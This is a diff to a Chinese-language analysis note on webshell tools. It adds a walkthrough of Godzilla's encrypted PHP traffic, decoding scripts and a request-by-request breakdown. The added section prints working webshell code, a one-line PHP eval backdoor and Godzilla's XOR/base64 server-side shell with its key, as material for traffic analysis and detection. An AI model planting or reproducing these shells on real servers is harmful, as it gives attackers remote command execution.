@@ -15,7 +15,9 @@ webshell是以`php`、`jsp`等形式存在的一种命令执行环境，是网�
 <?php @eval($_POST['pass']); ?>
 ```
 
-`冰蝎`和`哥斯拉`是基于流量加密实现的，**此时所谓的连接密码为对应加解密的密钥（或尤其派生）**，请求体中的所有流量都会被加密，服务器端侧需要上传对应生成的webshell以能够解密。
+`冰蝎`是基于流量加密实现的，**此时所谓的连接密码为对应加解密的密钥（或尤其派生）**，请求体中的所有流量都会被加密，服务器端侧需要上传对应生成的webshell以能够解密。
+
+最后`哥斯拉`是类似上面的结合。
 
 ## 中国菜刀
 
@@ -57,7 +59,7 @@ QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2lj
 
 ## 冰蝎
 
-1. php服务器端webshell如下（位于安装目录的`server`目录下），解密密钥为`e45e329feb5d925b`，通过`md5("rebeyond")[0:16`]得到，其中`rebeyond`是冰蝎3.0的默认密码。无密钥无法从流量层面进行解密。
+1. php服务器端webshell如下（位于安装目录的`server`目录下），解密密钥为`e45e329feb5d925b`，通过`md5("rebeyond")[0:16]`得到，其中`rebeyond`是冰蝎3.0的默认密码。无密钥无法从流量层面进行解密。
 ```php
 <?php
 @error_reporting(0);
@@ -99,4 +101,141 @@ session_start();
 
 ## 哥斯拉
 
-TODO
+1. 哥斯拉生成的木马为如下一句话木马，哥斯拉拥有`密码`和`密钥`2个概念，为用户指定无默认值
+```php
+<?php
+eval($_POST["pass"]);
+```
+
+2. 以`PHP_EVAL_XOR_BASE64`加密器分析，这里设`密码`为`pass`，`密钥`为`key1`，会使用该密钥进行异或操作
+![](/data/image/web//flow/image-13.png)
+
+其中，`密码`类似`菜刀`和`蚁剑`，定义了payload的执行框架，`密钥`则通过`md5("key1")[0:16]`得到
+
+3. 哥斯拉点击`进入`后（执行其他命令之前），抓包会发现3对请求和响应，下面逐个分析
+![](/data/image/web//flow/image-11.png)
+
+**第一对**
+请求`pass`参数
+![](/data/image/web//flow/image-12.png)
+```php
+@session_start();
+@set_time_limit(0);
+@error_reporting(0);
+function encode($D,$K){
+    for($i=0;$i<strlen($D);$i++) {
+        $c = $K[$i+1&15];
+        $D[$i] = $D[$i]^$c;
+    }
+    return $D;
+}
+$pass='key1';
+$payloadName='payload';
+$key='c2add694bf942dc7';
+if (isset($_POST[$pass])){
+    $data=encode(base64_decode($_POST[$pass]),$key);
+    if (isset($_SESSION[$payloadName])){
+        $payload=encode($_SESSION[$payloadName],$key);
+        if (strpos($payload,"getBasicsInfo")===false){
+            $payload=encode($payload,$key);
+        }
+		eval($payload);
+        echo substr(md5($pass.$key),0,16);
+        echo base64_encode(encode(@run($data),$key));
+        echo substr(md5($pass.$key),16);
+    }else{
+        if (strpos($data,"getBasicsInfo")!==false){
+            $_SESSION[$payloadName]=encode($data,$key);
+        }
+    }
+}
+```
+
+请求`key1`参数，解码代码如下
+```php
+<?php
+
+function encode($D,$K){
+    for($i=0;$i<strlen($D);$i++) {
+        $c = $K[$i+1&15];
+        $D[$i] = $D[$i]^$c;
+    }
+    return $D;
+}
+
+$pass='key1';
+$payloadName='payload';
+$key='c2add694bf942dc7';
+$data=encode(base64_decode("xxx"), $key);
+
+?>
+```
+![](/data/image/web//flow/image-14.png)
+
+第一对请求主要是在设置session，`$_SESSION[$payloadName]`中存储了几十种功能函数，如`test`/`run`/`isGzipStream`/`bigFileUpload`等等
+请求不含有任何Cookie信息，服务器响应报文不含任何数据，但是会设置PHPSESSID，后续请求都会自动带上该Cookie。
+![](/data/image/web//flow/image-15.png)
+
+**第二对**
+
+请求`pass`参数同上
+
+请求`key1`参数，解码代码同上
+![](/data/image/web//flow/image-16.png)
+
+既执行以下在第一步中定义的`test`函数，可以预期返回为`ok`
+```php
+function test(){
+    return "ok";
+}
+```
+
+响应如下
+```
+88fb12c30e6398d8LepsZDY5NGJmMv/9YmNwvu4YZmQ2OQ==9175a0b78537a809
+```
+
+去除首`echo substr(md5($pass.$key),0,16);`尾`echo substr(md5($pass.$key),16);`各附加的16位的混淆字符后，使用以下代码进行解码（响应多了一层`gzdecode`）：
+```php
+<?php
+
+function encode($D,$K){
+    for($i=0;$i<strlen($D);$i++) {
+        $c = $K[$i+1&15];
+        $D[$i] = $D[$i]^$c;
+    }
+    return $D;
+}
+
+$pass='key1';
+$payloadName='payload';
+$key='c2add694bf942dc7';
+$data=gzdecode(encode(base64_decode("xxx"),$key));
+
+echo $data;
+
+?>
+```
+![](/data/image/web//flow/image-17.png)
+
+**第三对**
+
+请求`pass`参数同上
+
+请求`key1`参数，解码代码同上
+![](/data/image/web//flow/image-18.png)
+
+既执行在第一步中定义的`getBasicsInfo`函数
+
+响应解码如上，返回如下信息
+
+![](/data/image/web//flow/image-19.png)
+
+后续执行其他命令流程也同上
+
+
+4. 总结
+- 请求形式`pass=evalContent&key=xxx`，其中`pass`是`密码`，`key`是`密钥`
+- 每个请求中的`pass=evalContent`部分都是相同的
+- 每个请求中的`key=xxx`才是实际执行的操作，`xxx`经过特定算法如`PHP_EVAL_XOR_BASE64`经过密钥加密/编码处理
+- 响应也是经过同样的加密/编码处理，只不过需要额外的`gzdecode`操作
